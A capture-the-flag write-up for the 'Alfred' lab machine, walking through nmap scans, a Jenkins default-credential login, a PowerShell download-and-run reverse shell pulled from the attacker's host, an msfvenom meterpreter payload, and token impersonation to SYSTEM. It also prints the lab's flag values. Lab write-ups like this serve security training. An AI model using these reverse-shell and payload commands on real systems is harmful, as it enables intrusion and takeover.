# CTF Writeup: Alfred

---

Mapped target_ip 10.10.164.148 in /etc/hosts to alfred.thm

```
sudo echo "10.10.164.148  alfred.thm" | sudo tee -a /etc/hosts
```

## Nmap Scan

```
nmap -n -Pn -A alfred.thm             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 03:55 CDT
Nmap scan report for alfred.thm (10.10.164.148)
Host is up (0.034s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Microsoft Windows 2008|7|Phone|Vista (92%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (92%), Microsoft Windows Server 2008 R2 SP1 (88%), Microsoft Windows Server 2008 R2 or Windows 8 (87%), Microsoft Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%), Microsoft Windows Vista or Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   31.93 ms 10.21.0.1
2   31.95 ms 10.10.164.148

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.50 seconds
```
Unfortunately those weren't all TCP Services running on the system. So I did another nmap scan.

```
nmap -sS  -Pn -p- 10.10.164.148 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 04:11 CDT
Nmap scan report for alfred.thm (10.10.164.148)
Host is up (0.040s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
```

## Reconaissance

Decided to analyze http (80) first. Ran gobuster & ffuf on it to enumerate sub-domains 
and hidden directories, but couldn't retrieve anything. The picture in the webpage also
didn't give me any valuable metadata or hidden data.

Looked at http (8080), in which there is a jenkins login page.

Logged in with following credentials: 

```
admin:admin.
```

Within jenkins dashboard I did navigate onto the project and created a new build, by pressing
"Build Now". After that I pressed configure, navigated all the way down.
The Build step is "Execute Windows batch command" and I prompted the following payload inside it:

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.21.156.104:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.21.156.104 -Port 1234
```

I also cloned the following repository, since this is prompted by the CTF itself.

```
https://github.com/samratashok/nishang
```
So the payload basically downloads the nishang script/reverse shell and the 2. half of the payload executes this script and allows us to get a reverse shell.
I also had to set up a listener utilizing netcat and a webserver, so the target machine can download the payload from my local machine.

```
python3 -m http.server 8000
```

```
nc -lvnp 1234
```
Pressed on the permalink of "Last build" and gained RCE as user "bruce"

```
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.21.156.104] from (UNKNOWN) [10.10.164.148] 49311
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>cd /
PS C:\> whoami
alfred\bruce
```

Retrieved user.txt in C:\Users\bruce\Desktop\

```
79007a09481963edf2e1321abd9ae2a0
```
Made whoami /priv

Since the privilege escalation will be done by impersonating tokens, we will have to
utilize Metasploit. So our next objective will be to generate a new payload using msfvenom.

```
msfvenom -a x86 -p windows/meterpreter/reverse_tcp --encoder x86/shikata_ga_nai LHOST=10.21.156.104 LPORT=1234 -f exe -o shell.exe
```

Added another python3 webserver to upload the files & utilized the following powershell command to download my exploit on the target machine:

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.21.156.104:8000/shell.exe','shell.exe')"
```

Now the payload is on the target system. Opened up metasploit 

```
msfconsole -q
```

and started up a listener, configured payload, LPORT & LHOST.

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 1234
set LHOST 10.21.156.104
exploit
```
On target system i executed the file utilizing powershell command:

```
Start-Process "shell.exe"
```
Gained Meterpreter Session as user "bruce".

Since I know the SeImpersonatePrivilege is available. I loaded the module incognito, which allows us 
to use the privilege as attack vector, to enhance our privileges.

```
load incognito
```
Utilized following command to display all the available tokens.

```
list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\WdiSystemHost
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
No tokens available
```

Decided to use BUILTIN\Administrators token.

```
impersonate_token "BUILTIN\Administrator"
```
Gained NT AUTHORITY\SYSTEM privs, migrated to lsass.exe, which had the PID of 767 in my case.

```
migrate 767
```

Retrieved root.txt in C:\Windows\System32\config

```
dff0f748678f280250f25a45b8046b4a
```
